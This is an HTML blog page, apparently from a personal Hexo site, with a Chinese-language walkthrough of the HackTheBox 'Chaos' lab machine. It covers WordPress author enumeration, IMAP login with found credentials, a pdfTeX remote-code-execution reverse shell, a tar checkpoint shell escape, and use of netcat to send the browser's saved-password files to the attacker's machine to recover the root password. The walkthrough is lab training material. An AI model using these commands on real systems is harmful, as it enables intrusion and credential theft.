@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="keyword" content="">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        HackTheBox Chaos - undefined
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i>  </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+ 
+        <div class="name">
+            <i>K</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li>
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li>
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li>
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li>
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input">
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+        <div class="index-about-mobile">
+            <i>  </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        HackTheBox Chaos
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-03-06 01:05:02</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#HackTheBox" title="HackTheBox">HackTheBox</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+
+    </div>
+    <div class="post-content ">
+        <p>###Chaos 靶机渗透</p>
+<p>####靶机地址：<a href="https://www.hackthebox.eu/home/machines/profile/167" target="_blank" rel="noopener">https://www.hackthebox.eu/home/machines/profile/167</a></p>
+<p>####目标IP: 10.10.10.120(Linux)</p>
+<p>####本机IP: 10.10.14.97(Kali)</p>
+<p>#####使用nmap对目标进行扫描 <code>nmap -sS 10.10.10.120</code><br><img src="https://p0.ssl.qhimg.com/t010487ac52686743fc.png" alt=""></p>
+<p>######nmap返回的信息中告诉我们很多有用的信息:<br>        80：我们可以尝试在浏览器访问找出有用的信息<br>        110：运行有pop3邮件服务器<br>        143：运行imap邮件服务器<br>        993：imap邮件服务器的ssl通道<br>        995：pop3邮件服务器的ssl通道</p>
+<p>#####我们访问WEB页面查看有什么可以利用的信息。</p>
+<p>######发现web页面收禁止我们使用IP访问<br><img src="https://p0.ssl.qhimg.com/t0106e95f1a51e63771.png" alt=""></p>
+<p>#####那我们使用drbp对目标进行一波目录扫描，看下有什么可用的信息。</p>
+<p>######发现一个wordpress博客<br><img src="https://p1.ssl.qhimg.com/t01512e963acfa9e1b2.png" alt=""></p>
+<p>#####我们进去博客发现它说让我们输入密码才能查看这个文章，那我们不知道密码怎么，那就是试着用作者名字是否就是密码，那我们也不知道作者名字啊。怎么办？这时候就要利用一个WP的一个小漏洞了。<br><img src="https://p5.ssl.qhimg.com/t017f442e90389b2223.png" alt=""></p>
+<p>#####在浏览器上输入<code>?author=1</code>就会发现下面出现了作者的名字。这时候我们就把名字输入Password里面去。<br><img src="https://p1.ssl.qhimg.com/t0108a033f776181ba7.png" alt=""><br>这时候我们就看到了suer和pass，但是这里写着说是webmail的，也就是说这是邮箱服务器的账号密码，不是后台的。</p>
+<p>######那么这时候我们登录邮件服务器。<br>        连接imap openssl s_client -connect 10.10.10.120:993`<br>        这里需要注意使用telnet是无法连接的，只有用ssl才能连接。<br>        然后输入 a LOGIN ayush jiujitsu<br>        这里的a是代号，顺便输入也行， LOGIN 是固定的，ayush是账号,jiujitsu是密码。<br><img src="https://p5.ssl.qhimg.com/t014d7f10de22a6ad78.png" alt=""></p>
+<p>######进去imap服务器之后我们看下有什么可利用的信息。</p>
+<p>######输入<code>a list &quot;&quot; *</code> 发现有一个叫INbox的箱子很是可疑。那么我们就进这个箱子看下。<br><img src="https://p0.ssl.qhimg.com/t0108c611885e8d8e1c.png" alt=""></p>
+<p>######进这个箱子发现什么都没有，比我的脸还要干净。<br><img src="https://p4.ssl.qhimg.com/t012e2c5e51d1edfa0c.png" alt=""></p>
+<p>######找来找去我们发现什么都没有，怎么办？突然想起邮件的草稿我们还没看，那么我们进去看下</p>
+<p>######输入<code>* select Drafts</code>后发现里面有一个封草稿邮件，发现有邮件那么我们就看下这邮件里面有什么可利用的信息。</p>
+<p>#####我们发现里面有两个文件，一个enim_msg.txt,一个是en.py。<br><img src="https://p1.ssl.qhimg.com/t01e385b171ac1cddc4.png" alt=""></p>
+<p>######我们把这两个文件都copy下载</p>
+<p>#####邮件中有提到base64解密，那么我们就把这两个文件都交给base64解一下。<br><img src="https://p4.ssl.qhimg.com/t013be8b2e07ddfcbc1.png" alt=""><br><img src="https://p3.ssl.qhimg.com/t01b160e11000c2475c.png" alt=""></p>
+<p>#####两个文件我们只解出一个en.py，另一个enimg_msg.txt解出了还是加密的。那我们先不理enimg_msg文件，我们来看下en.py。<br><img src="https://p0.ssl.qhimg.com/t010788b4e7f6a261a2.png" alt=""></p>
+<p>#####看了一遍又一遍看不懂这是什么，那直接把全部的代码都丢到google上面，然后发现了有一个完整的python脚本。<br><img src="https://p4.ssl.qhimg.com/t01b242da8a2c9aa2ca.png" alt=""></p>
+<p>#####使用脚本来解enimg_msg.txt就得到一个web地址<br><img src="https://p1.ssl.qhimg.com/t0171b112d4269bc125.png" alt=""></p>
+<p>#####那么我们现在来看下这个http地址有什么可以利用的信息。<br><img src="https://p3.ssl.qhimg.com/t0183455f39392850d9.png" alt=""></p>
+<p>######发现这是一个txt转pdf的插件，那么我们google一下看下pdfTeX这个插件，发现有一个远程执行代码漏洞，那么我们马上开干。</p>
+<p>#####这次用的是python返回shell一句话和nc，python一句话需要注意的是必须要进行url编码不然是无法使用的<br><img src="https://p2.ssl.qhimg.com/t017621fa2a12cfe77f.png" alt=""></p>
+<p>#####getshell之后我们看下自己的权限，发现是www权限，那么我们就要进行提权，这时候我们来试下webemail的账号是否能在这里登录。<br><img src="https://p0.ssl.qhimg.com/t018b5dd9bc8e9ff0a4.png" alt=""></p>
+<p>######ayush账号可以在这里登陆，那么我们就开始提权。PS：要是nc 无法执行su命令那么就执行 <code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;</code>就可以使用su命令了。</p>
+<p>#####尝试提权</p>
+<p>######查看我们可以使用什么命令，发现我们可以tar，那么我们就输入<br><code>tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/sh</code><br><img src="https://p2.ssl.qhimg.com/t01ac200fda735e580f.png" alt=""></p>
+<p>#####这时候我们就可以使用/bin/sh，然后我们去到该用户的主目录，在这里我们找到了user.txt。<br><img src="https://p4.ssl.qhimg.com/t01786ebf836c6c56ad.png" alt=""></p>
+<p>#####提权各种套路都试下了，还是无法提权，这时候想到.Mozilla是否存放有有关root的密码，因为如果有管理员这台机子上网说不定有保存密码，然而密码说不定就和root密码相同。在目标机上找到.mozilla文件里面的logins.json和key4.db 把他们copy到kali上。</p>
+<pre><code>在目标机上执行`/bin/nc -w 3 10.10.12.163 5556 &lt; logins.json`
+在kali上执行`nc -l -p 5556 &gt; logins.json`
+</code></pre><p>#####把logins.json和key4.db文件覆盖了本地文件之后在火狐上查看密码，然后发现里面真的有root密码。<br><img src="https://p0.ssl.qhimg.com/t01f25a43ff0f0a7542.png" alt=""></p>
+<p>#####使用root密码登陆进去，找到root.txt。<br><img src="https://p4.ssl.qhimg.com/t01a69e5bd87784012a.png" alt=""></p>
+<p>####后记：虽然这次的靶机的脑洞很大，但是可以在里面学到很多东西，imap的命令操作，使用tar提权等等。</p>
+
+        
+        <br>
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.xml"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+</html>
